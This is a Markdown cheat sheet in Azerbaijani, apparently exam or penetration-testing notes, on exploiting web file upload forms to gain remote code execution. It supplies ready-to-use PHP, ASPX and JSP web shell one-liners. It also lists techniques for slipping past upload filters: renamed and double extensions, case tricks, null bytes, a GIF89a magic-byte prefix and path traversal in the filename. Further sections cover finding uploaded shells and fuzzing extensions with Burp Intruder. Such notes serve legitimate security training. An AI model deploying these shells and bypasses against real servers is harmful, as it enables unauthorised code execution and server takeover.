---

```markdown
# 📂 File Upload (Fayl Yükləmə) Eksploytasiya Qeydləri

Bu sənəd veb tətbiqlərdə fayl yükləmə formalarını analiz etmək, müdafiə filtrlərini (WAF, Client-side və Server-side yoxlanışları) yan keçmək və sistemdə Veb Şell (Web Shell) işlədərək RCE əldə etmək üçün tam bələdçidir.

---

## 📌 1. Klassik Hücum Axışı (Attack Flow)

1. **Formun Analizi:** Səhifədəki fayl yükləmə funksiyasını tap (məsələn: profil şəkli, sənəd yükləmə).
2. **İlkin Sınaq (Baseline):** Legitim bir fayl (məsələn: `test.jpg`) yüklə və sorğunu **Burp Suite** ilə tut. Faylın hara yükləndiyini (`/uploads/`, `/images/` və s.) öyrən.
3. **Şell Göndərilməsi:** Zərərli skripti (`shell.php`) yükləməyə çalış. Əgər xəta mesajı gələrsə, tətbiq olunan filtr növünü təyin et və aşağıdakı bypass üsullarını tətbiq et.
4. **Kodun İcrası (RCE):** Yüklədiyiniz şell faylına brauzer və ya `curl` vasitəsilə müraciət et və əmrləri icra et.

---

## 🛠️ 2. Sürətli Veb Şell (Web Shell) Payload-ları

İmtahanda vaxt itirməmək üçün hədəf sistemin dilinə uyğun ən qısa şell kodları:

### A. PHP (Linux / Populyar Web Serverlər)
```php
<?php system($_GET['cmd']); ?>

```

*İstifadəsi:* `http://target.com/uploads/shell.php?cmd=id`

### B. ASPX (Windows / IIS Server)

```aspx
<%@ Page Language="JScript"%><%eval(Request.Item["cmd"],"unsafe");%>

```

*İstifadəsi:* `http://target.com/uploads/shell.aspx?cmd=whoami`

### C. JSP (Java Serverlər)

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

```

---

## 🛡️ 3. Müdafiə Filtrlərini Yan Keçmə Üsulları (Bypass Techniques)

### A. Müştəri Tərəfli (Client-Side / JavaScript) Filtrləri

Əgər siz faylı seçən kimi dərhal brauzerdə "Yalnız JPG yükləyə bilərsiniz" xətası gəlirsə, bu JavaScript filtridir.

* **Həlli:** `test.jpg` adlı legitim bir fayl seçin. Burp Suite-də intercept-i aktiv edin və faylı yükləyin. Burp daxilində faylın adını `test.jpg`-dən `shell.php`-ə dəyişdirin və sorğunu buraxın (Forward).

### B. Content-Type (MIME-Type) Filtrini Keçmək

Server yüklənən faylın daxili strukturuna yox, yalnız HTTP başlığındakı `Content-Type` dəyərinə baxa bilər.

* **Orijinal Sorğu:**
```http
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/x-php

```


* **Bypass:** `Content-Type` hissəsini legitim şəkil formatı ilə əvəzləyin:
```http
Content-Type: image/jpeg
# Və ya digərləri: image/png, image/gif, application/pdf

```



### C. Uzantı (Extension) Filtrlərini Keçmək

Server müəyyən uzantıları qara siyahıya (Blacklist) sala bilər. Aşağıdakı alternativlərlə bunu sındırın:

#### 1. Alternativ Uzantılar (PHP üçün):

Əgər `.php` bloklanıbsa, PHP mühərrikinin icra edə biləcəyi digər uzantıları yoxla:

* `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.phpt`, `.pgif`

#### 2. Böyük-Kiçik Hərf Manipulyasiyası (Case Sensitivity):

Əgər server filtri hərflərin reqistrinə həssasdırsa:

* `.pHp`, `.PhP`, `.pHP5`, `.AsPx`

#### 3. İkiqat Uzantı (Double Extensions):

Bəzən filtrlər yalnız sondakı uzantını yoxlayır, yaxud ortadakı `.php` sözünü silir.

* `.jpg.php` və ya `.png.php`
* `.php.jpg` (Əgər server Apache-dirsə və səhv konfiqurasiya olunubsa, faylı sağdan sola oxuyub daxildəki PHP-ni icra edə bilər).
* **Silinmə funksiyasına qarşı:** `.p.phphp` (Əgər server ortadakı `php` sözünü silərsə, kənarda qalan hərflər birləşərək yenidən `.php` yaradır).

#### 4. Null Byte Yan keçməsi (Köhnə sistemlər üçün):

Server faylın sonuna baxarkən ağ siyahını (Whitelist) yoxlayır, lakin faylı yaddaşa yazanda Null Byte (`%00`) simvolundan sonrasını oxumur.

* `shell.php%00.jpg`
* `shell.php\x00.jpg`

---

### D. Sehrli Baytlar (Magic Bytes / File Signatures)

Əgər server faylın həqiqətən şəkil olub-olmadığını yoxlamaq üçün onun ilk baytlarını (fayl imzasını) yoxlayırsa, şell kodumuzun ən yuxarı hissəsinə şəklin imzasını əlavə etməliyik.

* **GIF Sındırması (Ən rahatı):** Bütün GIF faylları `GIF89a;` mətni ilə başlayır. Şell faylını bu şəkildə hazırlayın:
```php
GIF89a;
<?php system($_GET['cmd']); ?>

```


* **PNG və ya JPG üçün (Hex Redaktoru ilə):** Burp-də sorğunu tutduqdan sonra `Hex` bölməsinə keçin və faylın ilk 4 baytını aşağıdakılarla əvəzləyin:
* **JPG üçün:** `FF D8 FF E0`
* **PNG üçün:** `89 50 4E 47`



---

### E. Path Traversal ilə Fayl Adının Manipulyasiyası

Bəzən server faylı təhlükəsiz (`/var/www/uploads/`) qovluğuna yükləyir, lakin həmin qovluqda PHP kodlarının icrası söndürülüb (No-Execute). Biz faylı başqa bir qovluğa sızdırmaq üçün `filename` parametrində qovluq dəyişmə simvollarından istifadə edirik:

```http
Content-Disposition: form-data; name="image"; filename="../../../../var/www/html/shell.php"

```

---

## 🎯 4. Yüklənmiş Şell-in Tapılması

Faylı uğurla yüklədikdən sonra brauzerdə onu çağırmaq üçün tipik qovluq yolları:

* `http://target.com/uploads/shell.php`
* `http://target.com/images/shell.php`
* `http://target.com/assets/shell.php`
* `http://target.com/files/shell.php`

*Qeyd: Əgər faylın adı yükləndikdən sonra server tərəfindən dəyişdirilirsə (məsələn: `md5(vaxt).jpg`), səhifənin mənbə koduna (Source Code) baxın və ya şəkil üzərində sağ düyməni sıxıb "Open Image in New Tab" edin.*

---

## 🤖 5. Burp Suite Intruder ilə Avtomatlaşdırılmış Fuzzing

Əgər hansı uzantının (extension) və ya Content-Type-ın işləyəcəyini bilmirsinizsə, Burp Intruder-dən istifadə edin:

1. Fərqli uzantılardan ibarət siyahı yaradın (Wordlist): `.php`, `.php5`, `.phtml`, `.jpg.php` və s.
2. Burp Suite-də fayl yükləmə sorğusunu **Intruder**-ə göndərin.
3. `filename="shell§.php§"` hissəsini hədəf (payload position) olaraq seçin.
4. **Sniper** hücum növünü seçib siyahınızı yükləyin və hücumu başladın.
5. Cavabların (Response) ölçüsünə (Length) və Status Koduna (200 OK) əsasən uğurlu uzantını tapın.

```

---
